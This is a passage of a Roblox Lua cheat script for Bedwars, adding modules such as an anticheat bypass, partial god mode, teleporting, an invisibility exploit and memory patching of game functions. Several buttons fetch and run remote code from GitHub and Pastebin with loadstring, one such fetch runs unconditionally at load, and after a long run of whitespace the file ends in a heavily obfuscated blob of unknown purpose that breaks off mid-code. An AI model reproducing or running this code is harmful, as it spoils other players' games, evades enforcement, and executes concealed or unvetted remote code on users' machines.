		local HeartBeatConnect2 = tick()
		local Value = HeartBeatConnect2 - (HeartBeatConnect2 - HeartBeatConnect <= 999 and 0 or 999)
		HeartBeatConnect = math.max(HeartBeatConnect,Value)
	end
	Disabler = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "AnticheatBypassV2",
	    HoverText = "better AnticheatBypass reel",
        Function = function(callback)
            if callback then
				SendNotify = true
				NoDisable = true
				task.spawn(function()
					repeat
						task.wait()
						RenderSteppedConnection = game:GetService("RunService").RenderStepped:Connect(getRenderStepped)
						HeartbeatConnection = game:GetService("RunService").Heartbeat:Connect(getHeartBeat)
						local item = getItemNear("scythe")
						repeat task.wait() until item
						if item and lplr.Character.HandInvItem.Value == item.tool and bedwars.CombatController then
							if DisablerMode.Value == "MoveDirection" then
								if DisablerSpeed.Enabled then
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.Humanoid.MoveDirection * DisablerTable.Values.MainSpeed
									})
								else
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.Humanoid.MoveDirection
									})
								end
							elseif DisablerMode.Value == "LookVector" then
								if DisablerSpeed.Enabled then
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.HumanoidRootPart.CFrame.LookVector * DisablerTable.Values.MainSpeed
									})
								else
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.HumanoidRootPart.CFrame.LookVector
									})
								end
							end
							if entityLibrary.isAlive and entityLibrary.character.Head.Transparency ~= 0 then
								bedwarsStore.scythe = tick() + 1
							end
						elseif item and lplr.Character.HandInvItem.Value ~= item.tool and bedwars.CombatController then
							if SendNotify then
								if DisablerNotify.Value == "Vape" then
									warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context1,DisablerTable.Values.Duration)
								elseif DisablerNotify.Value == "Print" then
									print(DisablerTable.Messages.Context3)
								elseif DisablerNotify.Value == "Warn" then
									warn(DisablerTable.Messages.Context3)
								elseif DisablerNotify.Value == "Combined" then
									warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context1,DisablerTable.Values.Duration)
									print(DisablerTable.Messages.Context3)
									warn(DisablerTable.Messages.Context3)
								end
								SendNotify = false
							end
							if DisablerMissing.Value == "Continue" then
								task.wait(DisablerTable.Values.Duration)
								SendNotify = true
								NoDisable = true
							elseif DisablerMissing.Value == "Disable" then
								NoDisable = false
							end
							if not NoDisable then
								Disabler.ToggleButton(false)
								return
							end
						elseif not item then
							if DisablerNotify.Value == "Vape" then
								warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context2,DisablerTable.Values.Duration)
							elseif DisablerNotify.Value == "Print" then
								print(DisablerTable.Messages.Context4)
							elseif DisablerNotify.Value == "Warn" then
								warn(DisablerTable.Messages.Context4)
							elseif DisablerNotify.Value == "Combined" then
								warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context2,DisablerTable.Values.Duration)
								print(DisablerTable.Messages.Context4)
								warn(DisablerTable.Messages.Context4)
							end
							Disabler.ToggleButton(false)
							return
						end
					until not Disabler.Enabled
				end)
			else
				HeartbeatConnection:Disconnect()
				RenderSteppedConnection:Disconnect()
            end
        end,
		ExtraText = function()
			return DisablerMode.Value
		end
    })
	DisablerMode = Disabler.CreateDropdown({
		Name = "Mode",
		List = {
			"MoveDirection",
			"LookVector"
		},
		HoverText = "Disabler Mode",
		Function = function() end,
	})
	DisablerMissing = Disabler.CreateDropdown({
		Name = "Missing Scythe",
		List = {
			"Continue",
			"Disable"
		},
		HoverText = "Actions that will occur when the Scythe is missing",
		Function = function() end,
	})
	DisablerNotify = Disabler.CreateDropdown({
		Name = "Notification",
		List = {
			"Vape",
			"Print",
			"Warn",
			"Combined"
		},
		HoverText = "Notification that will be displayed",
		Function = function() end,
	})
	DisablerDuration = Disabler.CreateSlider({
		Name = "Duration",
		Min = 1,
		Max = 10,
		HoverText = "Notification's Duration",
		Function = function() end,
		Default = 5
	})
	DisablerSpeedVal = Disabler.CreateSlider({
		Name = "Speed",
		Min = 1,
		Max = 100,
		HoverText = "Direction Speed",
		Function = function() end,
		Default = 90
	})
	DisablerSpeed = Disabler.CreateToggle({
		Name = "Speed",
		Default = true,
		HoverText = "Adds speed to the direction",
		Function = function() end,
	})
	DisablerNotification = Disabler.CreateToggle({
		Name = "Notification",
		Default = true,
		HoverText = "Notifies you when certain actions happen",
		Function = function() end,
	})
end)

local Nebula = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
	["Name"] = "NebulaSky",
	["Function"] = function(callback)
		if callback then
			task.spawn(function() 

				local Vignette = true


				local Lighting = game:GetService("Lighting")
				local ColorCor = Instance.new("ColorCorrectionEffect")
				local SunRays = Instance.new("SunRaysEffect")
				local Sky = Instance.new("Sky")
				local Atm = Instance.new("Atmosphere")


				for i, v in pairs(Lighting:GetChildren()) do
					if v then
						v:Destroy()
					end
				end

				ColorCor.Parent = Lighting
				SunRays.Parent = Lighting
				Sky.Parent = Lighting
				Atm.Parent = Lighting

				if Vignette == true then
					local Gui = Instance.new("ScreenGui")
					Gui.Parent = StarterGui
					Gui.IgnoreGuiInset = true

					local ShadowFrame = Instance.new("ImageLabel")
					ShadowFrame.Parent = Gui
					ShadowFrame.AnchorPoint = Vector2.new(0,1,0)
					ShadowFrame.Position = UDim2.new(0,0,0,0)
					ShadowFrame.Size = UDim2.new(0,0,0,0)
					ShadowFrame.BackgroundTransparency = 1
					ShadowFrame.Image = ""
					ShadowFrame.ImageTransparency = 1
					ShadowFrame.ZIndex = 0
				end


				ColorCor.Brightness = 0.1
				ColorCor.Contrast = 0.5
				ColorCor.Saturation = -0.3
				ColorCor.TintColor = Color3.fromRGB(255, 235, 203)

				SunRays.Intensity = 0.075
				SunRays.Spread = 0.727

				Sky.SkyboxBk = "rbxassetid://13581437029"
				Sky.SkyboxDn = "rbxassetid://13581439832"
				Sky.SkyboxFt = "rbxassetid://13581447312"
				Sky.SkyboxLf = "rbxassetid://13581443463"
				Sky.SkyboxRt = "rbxassetid://13581452875"
				Sky.SkyboxUp = "rbxassetid://13581450222"
				Sky.SunAngularSize = 10

				Lighting.Ambient = Color3.fromRGB(2,2,2)
				Lighting.Brightness = 0.3
				Lighting.ColorShift_Bottom = Color3.fromRGB(0,0,0)
				Lighting.ColorShift_Top = Color3.fromRGB(0,0,0)
				Lighting.EnvironmentDiffuseScale = 0.2
				Lighting.EnvironmentSpecularScale = 0.2
				Lighting.GlobalShadows = true
				Lighting.OutdoorAmbient = Color3.fromRGB(0,0,0)
				Lighting.ShadowSoftness = 0.2
				Lighting.ClockTime = 15
				Lighting.GeographicLatitude = 45
				Lighting.ExposureCompensation = 0.5

				Atm.Density = 0.364
				Atm.Offset = 0.556
				Atm.Color = Color3.fromRGB(179, 59, 249)
				Atm.Decay = Color3.fromRGB(155, 212, 255)
				Atm.Glare = 0.36
				Atm.Haze = 1.72	
                end)
			end
		end
    })

runFunction(function()
		local Reinject = {["Enabled"] = false}
		Reinject = GuiLibrary["ObjectsThatCanBeSaved"]["APEWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Reinject",
			["HoverText"] = "Reinjects Vape To Load Modules",
			   ["Function"] = function(Callback)
					Enabled = Callback
					if Enabled then
						Reinject["ToggleButton"](false)
						GuiLibrary["SelfDestruct"]()
						loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
	
	
					end
				end
		})
	end)

runFunction(function()
   Pink = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
	["Name"] = "PinkTheme",
	["Function"] = function(callback)
		if callback then
			task.spawn(function()
				for i,v in pairs(lightingService:GetChildren()) do
					if v:IsA("Atmosphere") or v:IsA("Sky") or v:IsA("PostEffect") then
						v:Remove()
					end
				end
				local sky = Instance.new("Sky")
				sky.SkyboxBk = "rbxassetid://1546230803"
				sky.SkyboxDn = "rbxassetid://1546231143"
				sky.SkyboxFt = "rbxassetid://1546230803"
				sky.SkyboxLf = "rbxassetid://1546230803"
				sky.SkyboxRt = "rbxassetid://1546230803"
				sky.SkyboxUp = "rbxassetid://1546230451"
				sky.Parent = lightingService
				pcall(function() workspace.Clouds:Destroy() end)
				local damagetab = debug.getupvalue(bedwars.DamageIndicator, 2)
				damagetab.strokeThickness = false
				damagetab.textSize = 32
				damagetab.blowUpDuration = 0
				damagetab.baseColor = Color3.fromRGB(255, 132, 178)
				damagetab.blowUpSize = 32
				damagetab.blowUpCompleteDuration = 0
				damagetab.anchoredDuration = 0
				debug.setconstant(bedwars.DamageIndicator, 83, Enum.Font.LuckiestGuy)
				debug.setconstant(bedwars.DamageIndicator, 102, "Enabled")
				debug.setconstant(bedwars.DamageIndicator, 118, 0.3)
				debug.setconstant(bedwars.DamageIndicator, 128, 0.5)
				debug.setupvalue(bedwars.DamageIndicator, 10, {
					Create = function(self, obj, ...)
						task.spawn(function()
							obj.Parent.Parent.Parent.Parent.Velocity = Vector3.new((math.random(-50, 50) / 100) * damagetab.velX, (math.random(50, 60) / 100) * damagetab.velY, (math.random(-50, 50) / 100) * damagetab.velZ)
							local textcompare = obj.Parent.TextColor3
							if textcompare ~= Color3.fromRGB(85, 255, 85) then
								local newtween = tweenService:Create(obj.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {
									TextColor3 = (textcompare == Color3.fromRGB(76, 175, 93) and Color3.new(0, 0, 0) or Color3.new(0, 0, 0))
								})
								task.wait(0.15)
								newtween:Play()
							end
						end)
						return tweenService:Create(obj, ...)
					end
				})
				local colorcorrection = Instance.new("ColorCorrectionEffect")
				colorcorrection.TintColor = Color3.fromRGB(255, 199, 220)
				colorcorrection.Brightness = 0.05
				colorcorrection.Parent = lightingService
				debug.setconstant(require(lplr.PlayerScripts.TS.controllers.global.hotbar.ui.healthbar["hotbar-healthbar"]).HotbarHealthbar.render, 16, 16745650)
			end)
		end
	end
})
end)

runFunction(function()
        local FlyGui = {Enabled = false}
        FlyGui = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
            Name = "FlyLoader",
            HoverText = "Loads FlyGui credits to Red",
            Function = function(callback)
                if callback then
                    if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        loadstring(game:HttpGet(('https://pastebin.com/raw/h5QDPy6s'),true))()
						FlyGui.ToggleButton(false)
						warningNotification("APE", "Fly Gui Should Be Loaded Up", 5)
					else
                end
            end
		end
    })
end)

	runFunction(function()
		local InfiniteYield = {Enabled = false}
		InfiniteYield = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "InfiniteYield",
			Function = function(callback)
				if callback then
					task.spawn(function()
					loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
					InfiniteYield["ToggleButton"](false)
					warningNotification("APE", "Loaded Infinite Yield!", 5)
					end)
				end
			end,
			HoverText = "infinite yield lel"
		})
	end)

runFunction(function()
	local AnimationPlayer = {Enabled = false}
	local AnimationPlayerBox = {Value = "11335949902"}
	local AnimationPlayerSpeed = {Speed = 1}
	local playedanim
	AnimationPlayer = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
		Name = "InvisibleExploit",
		HoverText = "put you underground",
		Function = function(callback)
			if callback then 
				if entityLibrary.isAlive then 
					if playedanim then 
						playedanim:Stop() 
						playedanim.Animation:Destroy()
						playedanim = nil 
					end
					local anim = Instance.new("Animation")
					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
                    if not suc then
                        id = AnimationPlayerBox.Value
                    end
                    anim.AnimationId = "rbxassetid://"..id
					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
					if suc then
                        lplr.Character.Humanoid.CameraOffset = Vector3.new(0, 3 / -2, 0)
                        lplr.Character.HumanoidRootPart.Size = Vector3.new(2, 3, 1.1)
						
						playedanim.Priority = Enum.AnimationPriority.Action4
						playedanim.Looped = true
						playedanim:Play()
						playedanim:AdjustSpeed(0 / 10)
						table.insert(AnimationPlayer.Connections, playedanim.Stopped:Connect(function()
							if AnimationPlayer.Enabled then
								AnimationPlayer.ToggleButton(false)
								AnimationPlayer.ToggleButton(false)
							end
						end))
					else
						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
					end
				end
				table.insert(AnimationPlayer.Connections, lplr.CharacterAdded:Connect(function()
					repeat task.wait() until entityLibrary.isAlive or not AnimationPlayer.Enabled
					task.wait(0.5)
					if not AnimationPlayer.Enabled then return end
					if playedanim then 
						playedanim:Stop() 
						playedanim.Animation:Destroy()
						playedanim = nil 
					end
					local anim = Instance.new("Animation")
					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
                    if not suc then
                        id = AnimationPlayerBox.Value
                    end
                    anim.AnimationId = "rbxassetid://"..id
					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
					if suc then
						playedanim.Priority = Enum.AnimationPriority.Action4
						playedanim.Looped = true
						playedanim:Play()
						playedanim:AdjustSpeed(AnimationPlayerSpeed.Value / 10)
						playedanim.Stopped:Connect(function()
							if AnimationPlayer.Enabled then
								AnimationPlayer.ToggleButton(false)
								AnimationPlayer.ToggleButton(false)
							end
						end)
					else
						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
					end
				end))
			else
				if playedanim then playedanim:Stop() playedanim = nil end
			end
		end
	})
end)

	runFunction(function()
		local HostPanelExploit = {Enabled = false}
		local oldhostattribute = nil
		HostPanelExploit = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "VisualHostPanel",
			HoverText = "only visual",
			Function = function(callback)
				task.spawn(function()
					if oldhostattribute == nil then 
						oldhostattribute = (lplr:GetAttribute("Cohost") or lplr:GetAttribute("Host")) and true or false
					end
					if not callback and bedwars.ClientStoreHandler:getState().Game.customMatch and oldhostattribute then 
						return
					end
					lplr:SetAttribute("Cohost", callback)
				end)
			end
		})
	end)

runFunction(function()
    local AutoSkywars = {Enabled = false}
    AutoSkywars = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "AutoSkywars",
	HoverText = "tp you to middle sometimes works (only skywars)",
        Function = function(callback)
            if callback then
                task.spawn(function()
                    if bedwarsStore.queueType:find("skywars") then
                        if bedwarsStore.matchState ~= 0 then return end
                        repeat task.wait() until bedwarsStore.matchState ~= 0
                        if (not AutoSkywars.Enabled) then return end
                        task.wait(0.1)
                        local tween = tweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {CFrame = workspace.SpectatorPlatform.floor.CFrame - Vector3.new(0,1.5,5)})
                        tween:Play()
                        tween.Completed:Wait()
                        task.wait(0.5)
                        workspace.SpectatorPlatform.floor.CanCollide = false
                    end
                end)
            end
        end
    })
end)

function IsAlive(plr)
    plr = plr or lplr
    if not plr.Character then return false end
    if not plr.Character:FindFirstChild("Head") then return false end
    if not plr.Character:FindFirstChild("Humanoid") then return false end
    if plr.Character:FindFirstChild("Humanoid").Health < 0.11 then return false end
    return true
end

runFunction(function()
    local GodMode = {Enabled = false}
    GodMode = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "PartialGodMode",
        Function = function(callback)
            if callback then
				spawn(function()
					while task.wait() do
						if (not GodMode.Enabled) then return end
						if (not GuiLibrary.ObjectsThatCanBeSaved.FlyOptionsButton.Api.Enabled) and (not GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.Enabled) then
							for i, v in pairs(game:GetService("Players"):GetChildren()) do
								if v.Team ~= lplr.Team and IsAlive(v) and IsAlive(lplr) then
									if v and v ~= lplr then
										local TargetDistance = lplr:DistanceFromCharacter(v.Character:FindFirstChild("HumanoidRootPart").CFrame.p)
										if TargetDistance < 25 then
											if not lplr.Character.HumanoidRootPart:FindFirstChildOfClass("BodyVelocity") then
												repeat task.wait() until bedwarsStore.matchState ~= 0
												if not (v.Character.HumanoidRootPart.Velocity.Y < -10*5) then
													lplr.Character.Archivable = true
			
													local Clone = lplr.Character:Clone()
													Clone.Parent = workspace
													Clone.Head:ClearAllChildren()
													gameCamera.CameraSubject = Clone:FindFirstChild("Humanoid")
				
													for i,v in pairs(Clone:GetChildren()) do
														if string.lower(v.ClassName):find("part") and v.Name ~= "HumanoidRootPart" then
															v.Transparency = 1
														end
														if v:IsA("Accessory") then
															v:FindFirstChild("Handle").Transparency = 1
														end
													end
				
													lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame + Vector3.new(0,100000,0)
				
													game:GetService("RunService").RenderStepped:Connect(function()
														if Clone ~= nil and Clone:FindFirstChild("HumanoidRootPart") then
															Clone.HumanoidRootPart.Position = Vector3.new(lplr.Character.HumanoidRootPart.Position.X, Clone.HumanoidRootPart.Position.Y, lplr.Character.HumanoidRootPart.Position.Z)
														end
													end)
				
													task.wait(0.3)
													lplr.Character.HumanoidRootPart.Velocity = Vector3.new(lplr.Character.HumanoidRootPart.Velocity.X, -1, lplr.Character.HumanoidRootPart.Velocity.Z)
													lplr.Character.HumanoidRootPart.CFrame = Clone.HumanoidRootPart.CFrame
													gameCamera.CameraSubject = lplr.Character:FindFirstChild("Humanoid")
													Clone:Destroy()
													task.wait(0.15)
												end
											end
										end
									end
								end
							end
						end
					end
				end)
			end
        end
    })
end)

	runFunction(function()
		local AutoEmber = {Enabled = false}
		AutoEmber = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "4BigGuysExploit",
			HoverText = "Automatically uses the ember ability.",
			Function = function(callback)
				if callback then 
					task.spawn(function()
						repeat 
							local saber = getItem("infernal_saber")
							if killauraNearPlayer and saber then 
								bedwars.ClientHandler:Get("HellBladeRelease"):SendToServer({chargeTime = 0.5, player = lplr, weapon = saber.tool})
							end
							task.wait()
						until not AutoEmber.Enabled
					end)
				end
			end
		})
	end)
	
loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/PrivateLMAO1/main/blacklisted.lua"))()

warningNotification("APE", "Loaded Succesfully By RayHafz!", 5)
																																																																						
do local a=[[77fuscator 0.5.0 - discord.gg/CEHsVcBcuf]];return(function(b,c,d,e,f,f,g,h,i,j,k,l,l,m,n,o,p,q,r,s,t,u,u,v,w,w,x,y,y,z,z,z,ba,ba,bb,bb,bb,bc)local bd,be,bf,bg,bh,bi,bj,bk,bl,bm,bn,bo,bp,bq,br,bs,bt,bu,bv,bw,bx,by,bz,ca,cb,cc,cd,ce,cf,cg,ch,ci,cj,ck,cl,cm,cn,co,cp,cq,cr=0 while true do if bd<=17 then if bd<=8 then if bd<=3 then if bd<=1 then if 0<bd then bl=1 else be,bf,bg,bh,bi,bj,bk=string.sub,table.concat,string.char,tonumber,next,(table.create or function(cs,ct)local cu={};for cv=1,cs do cu[cv]=ct;end;return cu;end)or tostring end else if 2==bd then bm=function(bi)local bk,cs,ct,cu,cv,cw,cx,cy=0 while true do if bk<=5 then if bk<=2 then if bk<=0 then cs,ct=g,g else if 1==bk then cu=bj(#bi)else cv=256 end end else if bk<=3 then cw=bj(cv)else if bk~=5 then for bj=0,cv-1 do cw[bj]=bg(bj)end else cx=1 end end end else if bk<=8 then if bk<=6 then cy=function()local bj,cz,da=0 while true do if bj<=2 then if bj<=0 then cz=bh(be(bi,cx,cx),36)else if 2>bj then cx=(cx+1)else da=bh(be(bi,cx,cx+cz-1),36)end end else if bj<=3 then cx=cx+cz else if bj~=5 then return da else break end end end bj=bj+1 end end else if bk==7 then cs=bg(cy())else cu[1]=cs end end else if bk<=9 then while((cx<#bi)and not(#a~=d))do local a=cy()if cw[a]then ct=cw[a]else ct=(cs..be(cs,1,1))end cw[cv]=(cs..be(ct,1,1))cu[(#cu+1)],cs,cv=ct,ct,(cv+1)end else if bk~=11 then return bf(cu)else break end end end end bk=bk+1 end end else bn=bm(b)end end else if bd<=5 then if bd==4 then bo={}else c={w,x,s,j,u,l,q,y,o,k,m,i,nil,nil,nil};end else if bd<=6 then bp=v else if 7<bd then br,bs=1,((-8948+(function()local a,b,c,d,q=0 while true do if a<=0 then b,c,d,q=0 else if a~=2 then while true do if(b==1 or b<1)then if(0<b)then q=(function(s)local v,w=0 while true do if v<=0 then w=0 else if v~=2 then while true do if(w<1)then s(s(s))else break end w=(w+1)end else break end end v=v+1 end end)(function(s)local v,w=0 while true do if v<=0 then w=0 else if v<2 then while true do if(w<=2)then if(w<0 or w==0)then if(c>286)then return s end else if(w<2)then c=(c+1)else d=(((d*943))%15993)end end else if(w<3 or w==3)then if((d%1590)>795 or(d%1590)==795)then d=((((d*123))%43241))return s else return s(s(s))end else if(4<w)then break else return s(s(s))end end end w=w+1 end else break end end v=v+1 end end)else c,d=0,1 end else if(b==2)then return d;else break end end b=(b+1)end else break end end a=a+1 end end)()))else bq=bp(bo)end end end end else if bd<=12 then if bd<=10 then if bd>9 then bu=function(a,b)local c,d=0 while true do if c<=1 then if 0<c then for q=0,31 do local s=(a%2)local v=b%2 if s==0 then if not(v~=1)then b=b-1 d=(d+2^q)end else a=(a-1)if(v==0)then d=d+(2^q)else b=b-1 end end b=b/2 a=(a/2)end else d=0 end else if c~=3 then return d else break end end c=c+1 end end else bt={}end else if 11==bd then bv=function(a,b)local c=0 while true do if c>0 then break else return(a*2^b);end c=c+1 end end else bw=function()local a,b,c=0 while true do if a<=1 then if 0==a then b,c=h(bn,br,br+2)else b,c=bu(b,bs),bu(c,bs);end else if a<=2 then br=br+2;else if a==3 then return((bv(c,8))+b);else break end end end a=a+1 end end end end else if bd<=14 then if 13==bd then do for a,b in o,l(bl)do bt[a]=b;end;end;else bx=bt end else if bd<=15 then by=function(a,b)local c=0 while true do if c==0 then return p((a/2^b));else break end c=c+1 end end else if bd==16 then bz=2^32-1 else ca=function(a,b)local c=0 while true do if c<1 then return((((a+b)-bu(a,b)))/2)else break end c=c+1 end end end end end end end else if bd<=26 then if bd<=21 then if bd<=19 then if bd>18 then cc=function(a,b)local c=0 while true do if c<1 then return bz-ca((bz-a),(bz-b))else break end c=c+1 end end else cb=bw()end else if 21~=bd then cd=function(a,b,c)local d=0 while true do if 1>d then if c then local c=(a/2^(b-1))%2^((c-1)-(b-1)+1)return c-(c%1)else local b=2^(b-1)return((a%(b+b)>=b)and 1 or 0)end else break end d=d+1 end end else ce=bw()end end else if bd<=23 then if 22<bd then cg=function()local a,b=0 while true do if a<=1 then if 1~=a then b=bu(h(bn,br,br),cb)else br=(br+1);end else if a~=3 then return b;else break end end a=a+1 end end else cf=function()local a,b,c,d,p=0 while true do if a<=1 then if 0<a then b,c,d,p=bu(b,cb),bu(c,cb),bu(d,cb),bu(p,cb);else b,c,d,p=h(bn,br,(br+3))end else if a<=2 then br=br+4;else if 4~=a then return(bv(p,24)+bv(d,16)+bv(c,8))+b;else break end end end a=a+1 end end end else if bd<=24 then ch,ci,cj=nil else if bd~=26 then ch=(-14488+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz=0 while true do if a<=10 then if a<=4 then if a<=1 then if a>0 then c=48533 else b=526 end else if a<=2 then d=3 else if a~=4 then p=270 else q=540 end end end else if a<=7 then if a<=5 then s=12318 else if 7>a then v=385 else w=137 end end else if a<=8 then x=35083 else if a==9 then y=254 else be=340 end end end end else if a<=15 then if a<=12 then if 11<a then bg=170 else bf=2 end else if a<=13 then bh=19255 else if 15~=a then bi=1 else bj=423 end end end else if a<=18 then if a<=16 then bk=240 else if a==17 then bs=0 else bw,by=bs,bi end end else if a<=19 then bz=(function(ca,cc)local ce=0 while true do if 1~=ce then cc(ca(ca,ca)and ca(ca,ca),cc(cc,(ca and ca))and cc(ca,cc))else break end ce=ce+1 end end)(function(ca,cc)local ce=0 while true do if ce<=2 then if ce<=0 then if bw>bk then local bk=bs while true do bk=(bk+bi)if not(bk~=bi)then return cc else break end end end else if 2>ce then bw=(bw+bi)else by=((by-bj)%bh)end end else if ce<=3 then if((by%be)<bg)then local be=bs while true do be=(be+bi)if((be>bf)or be==bf)then if(be<d)then return cc(ca(ca,(ca and cc)),cc(ca,ca))else break end else by=(by+y)%x end end else local x=bs while true do x=(x+bi)if(x<bf)then return cc else break end end end else if ce<5 then return ca else break end end end ce=ce+1 end end,function(x,y)local be=0 while true do if be<=2 then if be<=0 then if(bw>w)then local w=bs while true do w=w+bi if not(w~=bf)then break else return x end end end else if 2~=be then bw=bw+bi else by=((by*v)%s)end end else if be<=3 then if((by%q)>p)then local p=bs while true do p=(p+bi)if(p==bi or p<bi)then by=(by*b)%c else if not(not(p==d))then break else return x(y(x,y),x(y,x))end end end else local b=bs while true do b=b+bi if(b<bf)then return x else break end end end else if be~=5 then return y else break end end end be=be+1 end end)else if 20==a then return by;else break end end end end end a=a+1 end end)());else ci=((-25303+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz,ca=0 while true do if a<=0 then b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz,ca=0 else if a<2 then while true do if b<=10 then if(b<4 or b==4)then if(b==1 or b<1)then if not(b==1)then c=40425 else d=236 end else if(b<2 or b==2)then p=960 else if(4>b)then q=1920 else s=33223 end end end else if(b==7 or b<7)then if(b<5 or b==5)then v=2 else if not(7==b)then w=894 else x=201 end end else if(b==8 or b<8)then y=3 else if not(b==10)then be=1330 else bf=5906 end end end end else if b<=15 then if(b<12 or b==12)then if 11<b then bh=665 else bg=617 end else if(b<=13)then bi=211 else if not(b~=14)then bj=33389 else bk=787 end end end else if(b<18 or b==18)then if(b<=16)then bs=1 else if(18>b)then bw=0 else by,bz=bw,bs end end else if(b<=19)then ca=(function(cc,ce)local cs,ct=0 while true do if cs<=0 then ct=0 else if cs<2 then while true do if(ct==0)then ce(ce(cc,cc),cc(ce,ce))else break end ct=ct+1 end else break end end cs=cs+1 end end)(function(cc,ce)local cs,ct=0 while true do if cs<=0 then ct=0 else if 1<cs then break else while true do if(ct<=2)then if(ct==0 or ct<0)then if by>bi then local bi=bw while true do bi=(bi+bs)if not(bi~=bs)then return ce else break end end end else if not(1~=ct)then by=(by+bs)else bz=(((bz-bk)%bj))end end else if ct<=3 then if(bz%be)<bh then local be=bw while true do be=((be+bs))if(((be==bs)or be<bs))then bz=(bz*bg)%bf else if not(be~=y)then break else return ce(ce(ce,ce),(cc(ce,ce)and ce(cc,ce)))end end end else local be=bw while true do be=((be+bs))if not(not(be==v))then break else return ce end end end else if ct<5 then return ce else break end end end ct=(ct+1)end end end cs=cs+1 end end,function(be,bf)local bg,bh=0 while true do if bg<=0 then bh=0 else if 2>bg then while true do if(bh==2 or bh<2)then if(bh<=0)then if(by>x)then local x=bw while true do x=((x+bs))if not(not(not(x~=v)))then break else return bf end end end else if not(bh~=1)then by=((by+bs))else bz=(((bz+w)%s))end end else if(bh<=3)then if((bz%q)>p)then local p=bw while true do p=((p+bs))if(((p<bs)or(p==bs)))then bz=((bz*d)%c)else if not(not(not(p~=y)))then break else return bf(be(be,(bf and be)),bf(bf,be))end end end else local c=bw while true do c=((c+bs))if(c>bs)then break else return be end end end else if not(5==bh)then return be else break end end end bh=bh+1 end else break end end bg=bg+1 end end)else if 20==b then return bz;else break end end end end end b=(b+1)end else break end end a=a+1 end end)()));end end end end else if bd<=31 then if bd<=28 then if bd==27 then cj=((-1671+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz,ca,cc,ce,cs,ct,cu,cv,cw,cx,cy,cz=0 while true do if a<=15 then if a<=7 then if a<=3 then if a<=1 then if a==0 then b=409 else c=818 end else if a<3 then d=28939 else p=222 end end else if a<=5 then if a==4 then q=389 else s=38485 end else if a==6 then v=1166 else w=583 end end end else if a<=11 then if a<=9 then if 8<a then y=425 else x=9454 end else if a~=11 then be=4509 else bf=442 end end else if a<=13 then if 12<a then bh=3 else bg=292 end else if 15>a then bi=1696 else bj=848 end end end end else if a<=23 then if a<=19 then if a<=17 then if a<17 then bk=579 else bs=10108 end else if 19~=a then bw=252 else by=908 end end else if a<=21 then if 20<a then ca=470 else bz=5205 end else if 23>a then cc=746 else ce=1816 end end end else if a<=27 then if a<=25 then if a==24 then cs=18568 else ct=2 end else if a==26 then cu=1 else cv=421 end end else if a<=29 then if a==28 then cw=0 else cx,cy=cw,cu end else if a<=30 then cz=(function(da,db,dc,dd)local de=0 while true do if de>0 then break else da(db(dd,dd,dc,dd),dc(db,da,db,dd),dc(dc,db,dc,dc),dd((db and da),dd,dc,dc))end de=de+1 end end)(function(da,db,dc,dd)local de=0 while true do if de<=2 then if de<=0 then if((cx>cv))then local cv=cw while true do cv=(cv+cu)if((cv<ct))then return db else break end end end else if de==1 then cx=(cx+cu)else cy=((cy+cc)%cs)end end else if de<=3 then if(((cy%ce)==by or(cy%ce)>by))then local by=cw while true do by=by+cu if((by==cu or by<cu))then cy=(cy-ca)%bz else if not(not(by==ct))then return db(da(dc,da,da,(db and dc)),dc(db,db,da,((dc and dd))),dc(da,dd,da,dc),((da(dc,((dd and db)),db and dc,da)and da(((dc and dd)),dc and da,dd,dc))))else break end end end else local by=cw while true do by=by+cu if not((by~=ct))then break else return da end end end else if 